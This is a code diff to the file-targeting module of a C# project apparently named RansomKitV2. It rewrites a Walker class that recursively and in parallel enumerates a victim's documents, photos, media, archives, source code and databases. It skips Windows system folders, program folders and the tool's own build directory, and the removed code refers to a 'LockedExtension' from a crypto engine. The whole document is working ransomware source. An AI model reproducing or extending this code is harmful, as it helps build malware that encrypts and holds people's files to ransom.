@@ -1,93 +1,120 @@
 using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Threading.Tasks;
 
 namespace RansomKitV2
 {
-    internal static class Walker
+    public static class Walker
     {
-        private static readonly HashSet<string> TargetExtensions = new(StringComparer.OrdinalIgnoreCase)
+        private static readonly HashSet<string> AllowedExtensions = new(StringComparer.OrdinalIgnoreCase)
         {
-            ".txt",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".rtf",".odt",
-            ".jpg",".jpeg",".png",".gif",".bmp",".tiff",".webp",".svg",
-            ".mp3",".wav",".flac",".aac",".ogg",".m4a",
-            ".mp4",".mkv",".avi",".mov",".wmv",".webm",
-            ".zip",".rar",".7z",".tar",".gz",".bz2",
-            ".cs",".cpp",".c",".h",".hpp",".py",".js",".ts",".java",".go",".rs",".rb",".php",
-            ".sql",".db",".sqlite",".mdb",".accdb",
-            ".psd",".ai",".eps",".indd",".sketch",
-            ".kdbx",".pem",".pfx",".key",".ovpn",
-            ".bak",".old",".backup",".save",".dat",
+            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".csv", ".odt", ".ods", ".odp",
+            ".mp3", ".wav", ".flac", ".aac", ".ogg", ".m4a",
+            ".mp4", ".mkv", ".avi", ".mov", ".wmv", ".flv", ".webm",
+            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".psd", ".ai", ".raw", ".heic",
+            ".zip", ".rar", ".7z", ".tar", ".gz", ".iso",
+            ".cs", ".cpp", ".c", ".h", ".py", ".js", ".ts", ".html", ".css", ".php", ".java", ".rb", ".go", ".rs",
+            ".sln", ".csproj", ".vcxproj", ".xcodeproj", ".json", ".xml", ".yml", ".yaml", ".sql", ".db", ".sqlite"
         };
 
-        private static readonly HashSet<string> SkipDirs = new(StringComparer.OrdinalIgnoreCase)
-        {
-            "Windows","WinSxS","System32","SysWOW64",
-            "Program Files","Program Files (x86)","ProgramData",
-            "AppData","$Recycle.Bin","System Volume Information",
-            "Recovery","PerfLogs","Boot",
-            "node_modules",".git",".vs","bin","obj","packages",
-        };
+        private static readonly string[] ForbiddenPaths;
 
-        private static readonly HashSet<string> SkipExtensions = new(StringComparer.OrdinalIgnoreCase)
+        static Walker()
         {
-            ".exe",".dll",".sys",".drv",".ocx",".mui",".lnk",".tmp",".lock",
-            CryptoEngine.LockedExtension,
-        };
-
-        public static List<string> Walk(IEnumerable<string> roots)
-        {
-            var results = new List<string>();
-            foreach (var root in roots)
+            var forbidden = new List<string>
             {
-                if (string.IsNullOrEmpty(root)) continue;
+                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
+                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
+                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
+                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+            };
+
+            string currentDir = AppContext.BaseDirectory;
+            for (int i = 0; i < 5; i++)
+            {
+                if (string.IsNullOrEmpty(currentDir)) break;
                 try
                 {
-                    if (File.Exists(root))
+                    if (Directory.EnumerateFiles(currentDir, "*.sln").Any() ||
+                        Directory.EnumerateFiles(currentDir, "*.csproj").Any())
                     {
-                        if (ShouldTake(root)) results.Add(root);
-                        continue;
-                    }
-                    if (!Directory.Exists(root)) continue;
-
-                    var stack = new Stack<string>();
-                    stack.Push(root);
-                    while (stack.Count > 0)
-                    {
-                        string dir = stack.Pop();
-                        DirectoryInfo di;
-                        try { di = new DirectoryInfo(dir); } catch { continue; }
-                        if (SkipDirs.Contains(di.Name)) continue;
-
-                        try
-                        {
-                            foreach (var sub in di.EnumerateDirectories())
-                            {
-                                if (sub.Attributes.HasFlag(FileAttributes.ReparsePoint)) continue;
-                                stack.Push(sub.FullName);
-                            }
-                        }
-                        catch { }
-
-                        try
-                        {
-                            foreach (var f in di.EnumerateFiles())
-                                if (ShouldTake(f.FullName)) results.Add(f.FullName);
-                        }
-                        catch { }
+                        forbidden.Add(currentDir);
+                        break;
                     }
                 }
                 catch { }
+                var parent = Directory.GetParent(currentDir);
+                if (parent == null) break;
+                currentDir = parent.FullName;
             }
-            return results.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
+            forbidden.Add(AppContext.BaseDirectory);
+            ForbiddenPaths = forbidden.ToArray();
         }
 
-        private static bool ShouldTake(string path)
+        public static List<string> Walk(IEnumerable<string> roots)
         {
-            string ext = Path.GetExtension(path);
-            if (SkipExtensions.Contains(ext)) return false;
-            return TargetExtensions.Contains(ext);
+            var results = new ConcurrentBag<string>();
+            var options = new EnumerationOptions { IgnoreInaccessible = true };
+
+            Parallel.ForEach(roots, root =>
+            {
+                if (!string.IsNullOrWhiteSpace(root) && Directory.Exists(root))
+                {
+                    WalkDirectory(root, results, options);
+                }
+            });
+
+            return results.ToList();
+        }
+
+        private static void WalkDirectory(string dir, ConcurrentBag<string> results, EnumerationOptions options)
+        {
+            if (IsForbiddenDirectory(dir)) return;
+
+            try
+            {
+                foreach (var file in Directory.EnumerateFiles(dir, "*", options))
+                {
+                    string ext = Path.GetExtension(file);
+                    if (AllowedExtensions.Contains(ext))
+                    {
+                        results.Add(file);
+                    }
+                }
+
+                Parallel.ForEach(Directory.EnumerateDirectories(dir, "*", options), subDir =>
+                {
+                    WalkDirectory(subDir, results, options);
+                });
+            }
+            catch { }
+        }
+
+        private static bool IsForbiddenDirectory(string path)
+        {
+            foreach (var forbidden in ForbiddenPaths)
+            {
+                if (!string.IsNullOrWhiteSpace(forbidden) && path.StartsWith(forbidden, StringComparison.OrdinalIgnoreCase))
+                    return true;
+            }
+
+            string dirName = Path.GetFileName(path);
+            if (dirName.Equals("Windows", StringComparison.OrdinalIgnoreCase) ||
+                dirName.Equals("System32", StringComparison.OrdinalIgnoreCase) ||
+                dirName.Equals("WinSxS", StringComparison.OrdinalIgnoreCase) ||
+                dirName.Equals("$Recycle.Bin", StringComparison.OrdinalIgnoreCase) ||
+                dirName.Equals(".git", StringComparison.OrdinalIgnoreCase) ||
+                dirName.Equals("bin", StringComparison.OrdinalIgnoreCase) ||
+                dirName.Equals("obj", StringComparison.OrdinalIgnoreCase))
+            {
+                return true;
+            }
+            return false;
         }
     }
 }
